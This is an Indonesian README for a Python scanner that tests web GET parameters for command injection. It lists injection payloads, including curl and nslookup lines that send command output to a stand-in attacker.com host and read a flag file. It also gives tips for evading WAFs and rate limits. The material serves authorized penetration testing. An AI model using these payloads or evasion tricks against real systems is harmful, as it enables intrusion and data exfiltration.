# RCE Scanner Pro

Sebuah tool Python sederhana namun powerful untuk mendeteksi **OS Command Injection / Remote Code Execution (RCE)** pada parameter GET di aplikasi web.

Tool ini dirancang untuk **pengujian keamanan (pentest)** pada target yang **ANDA MILIKI** atau memiliki **izin eksplisit** untuk diuji.

**PENTING**: Penggunaan tanpa izin adalah ilegal dan melanggar etika hacking.

## Fitur Utama

- Deteksi berbasis **keyword** (uid, root, whoami, uname, dll.)
- Deteksi **time-based blind** (sleep, ping delay)
- Deteksi **timeout** sebagai indikasi blind RCE
- Perbandingan dengan **baseline response** (panjang response, waktu eksekusi)
- Payload lengkap termasuk teknik bypass (encoding, chaining, backtick, dll.)
- Support **Windows** dan **Linux/Unix**
- Custom payload dari file eksternal
- Delay antar request (untuk menghindari rate limit / WAF)
- Output berwarna dan ringkasan vulnerabilities di akhir
- User-Agent custom untuk menghindari blokir sederhana

## Instalasi
git clone https://github.com/username-anda/rce-scanner-pro.git
cd rce-scanner-pro
pip install requests colorama
Dependencies: requests, colorama (sudah termasuk di Python standard library untuk yang lain)
Cara Penggunaan
1. Basic Scan
Bashpython3 rce_scanner_pro.py "https://target.com/page.php?id=1"
2. Dengan Delay (lebih stealth)
Bashpython3 rce_scanner_pro.py "https://target.com/search?q=test" --delay 2.0
3. Dengan Custom Payloads
Buat file my_payloads.txt berisi satu payload per baris, contoh:
text;curl http://attacker.com/$(whoami)
|nslookup attacker.com
;$(cat /flag.txt)
Lalu jalankan:
Bashpython3 rce_scanner_pro.py "https://target.com/vuln.php?cmd=test" --payloads my_payloads.txt --delay 1.5
Contoh Output
text[!] PERINGATAN: Tool ini hanya boleh digunakan untuk pengujian keamanan...

[+] Target: https://target.com/vuln.php?id=1
[+] Parameter terdeteksi: ['id']
[+] Total payloads: 35
[+] Delay antar request: 1.0s

[i] Baseline: 200 | 0.45s | 1234 bytes

[*] Menguji parameter: id
[→] Payload: ;id
[!!] Keyword Match RCE → https://target.com/vuln.php?id=%3Bid
[→] Payload: ;sleep 5
[!!] Time Delay (Blind) RCE → https://target.com/vuln.php?id=%3Bsleep+5

================================================================================

=== RINGKASAN SCAN ===
[!!] Ditemukan 5 kemungkinan RCE!
   • Param: id | Payload: ;id | Type: Keyword Match
   • Param: id | Payload: &&whoami | Type: Keyword Match
   • Param: id | Payload: ;sleep 5 | Type: Time Delay (Blind)
Payload yang Digunakan (Default)
Tool sudah menyertakan payload modern seperti:

;id, &&id, |id
$(id), `id`
;sleep 5, &&ping -c 5 127.0.0.1
Bypass encoding: %0Aid, %3Bid
Windows: &whoami, &ping -n 5 127.0.0.1

Tips Penggunaan

Gunakan di lab dulu: DVWA, bWAPP, PortSwigger Web Security Academy
Kombinasikan dengan Burp Suite (copy request → tambah parameter)
Untuk target produksi, gunakan proxy/VPN
Jika terdeteksi WAF, coba ubah delay atau gunakan encoding

Kontribusi
Welcome! Silakan buka issue atau pull request jika ingin:

Tambah payload baru
Support POST method
Integrasi dengan crawler
Export report ke JSON/HTML

Lisensi
MIT License - Bebas digunakan, modifikasi, dan distribusi dengan tetap mencantumkan kredit.
Disclaimer
Penulis tidak bertanggung jawab atas penyalahgunaan tool ini. Gunakan secara etis dan legal.
Hack the planet, responsibly! 🛡️

Made with ❤️ for the cybersecurity community
